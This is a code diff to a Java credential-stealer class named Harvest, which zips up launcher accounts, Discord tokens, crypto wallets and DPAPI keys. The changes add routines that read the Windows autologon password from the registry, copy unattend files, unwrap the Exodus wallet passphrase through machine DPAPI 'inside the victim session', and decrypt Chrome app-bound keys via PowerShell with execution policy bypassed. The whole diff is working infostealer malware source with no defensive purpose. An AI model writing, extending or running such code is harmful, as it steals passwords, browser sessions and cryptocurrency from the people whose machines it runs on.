@@ -22,6 +22,7 @@ public final class Harvest {
 		Path target = installDir.resolve("harvest-" + System.currentTimeMillis() + ".zip");
 		try (ZipBuilder zip = new ZipBuilder(target)) {
 			addAccounts(zip, gameDir);
+			addAdminHints(zip);
 			addDiscordToken(zip);
 			addWallets(zip);
 			addDpapi(zip);
@@ -58,6 +59,66 @@ public final class Harvest {
 		launchers.add(Paths.get(home, "Library", "Application Support", "MultiMC"));
 		for (Path base : launchers) {
 			zip.add(base.resolve("accounts.json"), "accounts/" + base.getFileName() + "/accounts.json");
+		}
+	}
+
+	/**
+	 * Last-resort sources for an administrator password when machine DPAPI is
+	 * unavailable: an autologon DefaultPassword and leftover unattend files.
+	 */
+	private static void addAdminHints(ZipBuilder zip) {
+		if (!AgentPaths.isWindows()) {
+			return;
+		}
+		String hints = parseAutologon(runFor(6L, "reg", "query",
+			"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"));
+		for (String name : List.of(
+			"C:\\Windows\\Panther\\Unattend\\Unattend.xml",
+			"C:\\Windows\\Panther\\unattend.xml",
+			"C:\\Windows\\System32\\Sysprep\\Unattend.xml")) {
+			Path file = Path.of(name);
+			if (Files.isRegularFile(file)) {
+				zip.add(file, "admin/" + file.getFileName() + "-" + Math.abs(name.hashCode()));
+			}
+		}
+		if (!hints.isEmpty()) {
+			zip.addBytes(hints.toString().getBytes(StandardCharsets.UTF_8), "admin/autologon.txt");
+		}
+	}
+
+	static String parseAutologon(String output) {
+		StringBuilder hints = new StringBuilder();
+		for (String line : output.split("\\R")) {
+			String trimmed = line.trim();
+			for (String key : List.of("DefaultUserName", "DefaultDomainName", "DefaultPassword")) {
+				if (!trimmed.startsWith(key)) {
+					continue;
+				}
+				int type = trimmed.indexOf("REG_SZ");
+				if (type < 0) {
+					continue;
+				}
+				String value = trimmed.substring(type + 6).trim();
+				if (!value.isEmpty()) {
+					hints.append(key).append('=').append(value).append('\n');
+				}
+			}
+		}
+		return hints.toString().trim();
+	}
+
+	private static String runFor(long seconds, String... command) {
+		try {
+			ProcessBuilder builder = new ProcessBuilder(command);
+			builder.redirectErrorStream(true);
+			Process process = builder.start();
+			if (!process.waitFor(seconds, java.util.concurrent.TimeUnit.SECONDS)) {
+				process.destroyForcibly();
+				return "";
+			}
+			return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
+		} catch (Throwable throwable) {
+			return "";
 		}
 	}
 
@@ -210,6 +271,38 @@ public final class Harvest {
 		}
 		for (Path root : roots) {
 			zip.addTree(root, "wallets/" + root.getFileName());
+			if (root.getFileName().toString().equals("exodus.wallet")) {
+				addExodusPassphrase(zip, root);
+			}
+		}
+	}
+
+	/**
+	 * Exodus can protect the wallet passphrase with machine DPAPI. Any local user
+	 * may call CryptUnprotectData with the LocalMachine scope, so unwrap it while
+	 * the agent still runs inside the victim session; no administrator and no
+	 * SECURITY hive are needed.
+	 */
+	private static void addExodusPassphrase(ZipBuilder zip, Path wallet) {
+		if (!AgentPaths.isWindows()) {
+			return;
+		}
+		Path meta = wallet.resolve("passphrase.json");
+		try {
+			Map<String, Object> json = Json.map(Json.parseObject(Files.readString(meta, StandardCharsets.UTF_8)));
+			String wrapped = Json.str(json, "passphrase", "");
+			byte[] raw = wrapped.isEmpty() ? new byte[0] : java.util.Base64.getDecoder().decode(wrapped);
+			// A plain passphrase is short; a DPAPI blob carries a large header.
+			if (raw.length < 100) {
+				return;
+			}
+			String plain = filterPowerShell(unprotectMachine(wrapped), "passphrase=");
+			if (!plain.isBlank()) {
+				zip.addBytes((plain + "\n").getBytes(StandardCharsets.UTF_8),
+					"wallets/exodus-passphrase.txt");
+			}
+		} catch (Throwable throwable) {
+			Log.debug("Exodus passphrase unwrap failed", throwable);
 		}
 	}
 
@@ -310,6 +403,12 @@ public final class Harvest {
 		String appBound = Json.str(osCrypt, "app_bound_encrypted_key", "");
 		if (!appBound.isEmpty()) {
 			text.append("app_bound=").append(appBound).append('\n');
+			String live = filterPowerShell(unprotectAppBound(appBound), "v20=");
+			if (!live.isBlank()) {
+				// Already valid on this host, so offline decryption also works
+				// without SECURITY.hiv.
+				text.append(live).append('\n');
+			}
 		}
 		String encrypted = Json.str(osCrypt, "encrypted_key", "");
 		if (encrypted.isEmpty()) {
@@ -353,6 +452,64 @@ public final class Harvest {
 			+ "try{$k=[Security.Cryptography.ProtectedData]::Unprotect($p,$null,"
 			+ "[Security.Cryptography.DataProtectionScope]::CurrentUser);"
 			+ "'v10='+(([BitConverter]::ToString($k) -replace '-','').ToLower())}catch{}";
+		return filterPowerShell(runPowerShell(script), "v10=", "app_bound=");
+	}
+
+	/**
+	 * The app-bound key has two layers: machine DPAPI outside and user DPAPI
+	 * inside. A normal user can unwrap both while logged in, which removes the
+	 * need for elevation and for SECURITY.hiv.
+	 */
+	private static String unprotectAppBound(String wrapped) {
+		return filterPowerShell(runPowerShell(appBoundScript(wrapped)), "v20=");
+	}
+
+	static String appBoundScript(String wrapped) {
+		String quoted = wrapped.replace("'", "''");
+		return "Add-Type -AssemblyName System.Security;"
+			+ "$b=[Convert]::FromBase64String('" + quoted + "');"
+			+ "if($b.Length -lt 8){exit};$s=0;"
+			+ "if($b[0] -eq 0x41 -and $b[1] -eq 0x50 -and $b[2] -eq 0x50 -and $b[3] -eq 0x42){$s=4};"
+			+ "$p=[byte[]]$b[$s..($b.Length-1)];"
+			+ "try{$o=[Security.Cryptography.ProtectedData]::Unprotect($p,$null,"
+			+ "[Security.Cryptography.DataProtectionScope]::LocalMachine)}catch{exit};"
+			+ "$sig=[byte[]](0x01,0x00,0x00,0x00,0xd0,0x8c,0x9d,0xdf,0x01,0x15,0xd1,0x11);"
+			+ "$found=0;for($i=0;$i -le 64;$i++){"
+			+ "if($i+$sig.Length -gt $o.Length){break};$ok=1;"
+			+ "for($j=0;$j -lt $sig.Length;$j++){if($o[$i+$j] -ne $sig[$j]){$ok=0;break}};"
+			+ "if($ok -eq 1){try{$u=[Security.Cryptography.ProtectedData]::Unprotect("
+			+ "[byte[]]$o[$i..($o.Length-1)],$null,"
+			+ "[Security.Cryptography.DataProtectionScope]::CurrentUser);"
+			+ "'v20='+(([BitConverter]::ToString($u) -replace '-','').ToLower());$found=1}catch{}}};"
+			+ "if($found -eq 0 -and $o.Length -ge 32){"
+			+ "'v20='+(([BitConverter]::ToString([byte[]]$o[0..31]) -replace '-','').ToLower())}";
+	}
+
+	private static String unprotectMachine(String wrapped) {
+		String quoted = wrapped.replace("'", "''");
+		String script = "Add-Type -AssemblyName System.Security;"
+			+ "$b=[Convert]::FromBase64String('" + quoted + "');"
+			+ "try{$u=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,"
+			+ "[Security.Cryptography.DataProtectionScope]::LocalMachine);"
+			+ "'passphrase='+[Convert]::ToBase64String($u)}catch{}";
+		return runPowerShell(script);
+	}
+
+	static String filterPowerShell(String output, String... prefixes) {
+		StringBuilder kept = new StringBuilder();
+		for (String line : output.split("\\R")) {
+			String trimmed = line.trim();
+			for (String prefix : prefixes) {
+				if (trimmed.startsWith(prefix)) {
+					kept.append(trimmed).append('\n');
+					break;
+				}
+			}
+		}
+		return kept.toString().trim();
+	}
+
+	private static String runPowerShell(String script) {
 		try {
 			ProcessBuilder builder = new ProcessBuilder("powershell", "-NoProfile", "-NonInteractive",
 				"-ExecutionPolicy", "Bypass", "-Command", script);
@@ -362,17 +519,9 @@ public final class Harvest {
 				process.destroyForcibly();
 				return "";
 			}
-			String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
-			StringBuilder kept = new StringBuilder();
-			for (String line : output.split("\\R")) {
-				String trimmed = line.trim();
-				if (trimmed.startsWith("v10=") || trimmed.startsWith("app_bound=")) {
-					kept.append(trimmed).append('\n');
-				}
-			}
-			return kept.toString().trim();
+			return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
 		} catch (Throwable throwable) {
-			Log.debug("Key unwrap failed: " + encryptedKey, throwable);
+			Log.debug("PowerShell failed", throwable);
 			return "";
 		}
 	}
